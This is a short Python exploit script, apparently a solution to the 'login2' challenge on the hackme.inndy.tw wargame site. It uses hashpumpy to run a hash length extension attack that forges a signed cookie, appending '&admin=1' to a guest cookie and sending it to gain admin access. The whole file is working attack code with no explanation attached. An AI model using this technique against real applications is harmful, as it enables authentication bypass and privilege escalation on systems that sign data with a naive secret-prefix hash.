import hashpumpy
import base64
import requests

url = 'https://hackme.inndy.tw/login2/'
tmp = hashpumpy.hashpump('6bcb9c9155975a53e951b0b50f137480', 'name=guest&admin=0', '&admin=1', 32)
print(tmp[0])
print(tmp[1])
payload = base64.b64encode(tmp[0].encode('utf-8')+b'#'+tmp[1])
cookie = {
    'user':payload.decode()
}
r =requests.get(url=url,cookies=cookie)
print(r.content)
